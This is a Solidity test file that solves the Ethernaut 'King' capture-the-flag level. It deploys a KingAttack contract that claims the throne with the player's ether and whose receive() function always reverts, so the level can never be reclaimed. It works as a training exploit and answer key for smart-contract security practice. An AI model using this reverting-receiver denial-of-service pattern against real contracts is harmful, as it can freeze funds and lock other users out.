// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {King, KingFactory} from "ethernaut/levels/KingFactory.sol";

contract KingLevel is SetUpLevelTest {
    King internal king;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 1 ether;
        instanceBalance = 0.001 ether;
        level = address(new KingFactory());
        super.setUp();
        king = King(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        KingAttack kingAttack = new KingAttack();
        kingAttack.callValue{value: player.balance}(address(king));
        vm.stopPrank();
    }
}

contract KingAttack {
    function callValue(address _target) public payable {
        (bool success, ) = address(_target).call{value: msg.value}("");
        assert(success);
    }

    receive() external payable {
        revert();
    }
}
